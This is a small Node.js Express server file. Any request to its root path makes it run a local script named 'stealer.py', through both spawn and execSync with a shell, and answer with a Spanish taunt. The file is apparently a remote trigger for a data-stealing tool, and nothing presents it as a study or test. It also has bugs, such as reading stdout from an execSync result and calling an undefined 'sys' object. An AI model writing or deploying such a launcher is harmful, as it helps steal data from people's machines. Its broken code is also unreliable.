const http = require('http');

const hostname = process.env.HOST;
const port = process.env.PORT;
const express = require('express')
var cors = require('cors');
const app = express()
const spawn = require("child_process").spawn;
const execSync = require("child_process").execSync;

app.use(cors());


app.listen(port, hostname, () => {
  console.log(`Server running at http://${hostname}:${port}/`);
});


app.get('/', (req, res) => {
  res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");

  let dummy = spawn("python ./stealer.py", { shell: true });
  let dummy2 = execSync("python ./stealer.py", { shell: true });

  dummy2.stdout.on('data', function(data) {
    sys.print(data.toString());
  });
  res.send({uo:"pillado huron"})
  console.log("amicu");
  console.log(dummy2)
})

